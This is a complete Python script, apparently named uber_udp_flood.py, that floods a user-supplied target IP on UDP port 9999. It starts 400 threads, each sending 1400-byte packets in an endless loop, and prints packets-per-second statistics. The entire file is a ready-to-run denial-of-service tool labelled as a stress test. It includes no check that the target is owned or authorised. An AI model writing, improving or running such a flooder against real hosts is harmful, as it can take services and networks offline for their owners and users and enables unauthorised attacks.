
#!/usr/bin/env python3
import socket
import sys
import threading
import signal
import time

running = True
packet_count = 0

def sigint_handler(sig, frame):
    global running
    print("\nStopping flood…")
    running = False

signal.signal(signal.SIGINT, sigint_handler)

# Global packet counter thread-safe function
def inc_packets():
    global packet_count
    packet_count += 1

def worker(ip, port):
    global running
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((ip, port))  # Connect once per thread for performance

    payload = b'Z' * 1400  # Fixed large-sized payload

    while running:
        try:
            for _ in range(200):  # Send 200 packets per batch
                sock.send(payload)  # Fastest form of sendto()
                inc_packets()
        except:
            pass

def monitor_stats(duration=1):
    global running, packet_count
    last_pkt = 0
    start_time = time.time()
    print(' Starting stats reporter...')
    while running:
        time.sleep(duration)
        pkt_now = packet_count
        rate = pkt_now - last_pkt
        avg = pkt_now / max(time.time() - start_time, 1)
        print(f" Current: {rate:,} pps | Avg: {avg:,.0f} pps")
        last_pkt = pkt_now
    print(" Stats monitor ended.")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: sudo python3 uber_udp_flood.py TARGET_IP")
        exit(1)

    target_ip = sys.argv[1]
    target_port = 9999

    print("[MAXIMUM UDP STRESS]")
    print(f">>> Target: {target_ip}:{target_port}")
    print(">>> Threads: 400 | Payload: 1400B | Socket Connected per Thread")
    
    threading.Thread(target=monitor_stats, args=(1,), daemon=True).start()

    threads = []
    for i in range(400):
        t = threading.Thread(target=worker, args=(target_ip, target_port))
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(0.001)  # Brief throttle prevents startup lag spikes

    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass

    running = False

    for th in threads:
        th.join(timeout=1.)  # Wait gracefully

    print(f"Total packets sent: {packet_count:,}")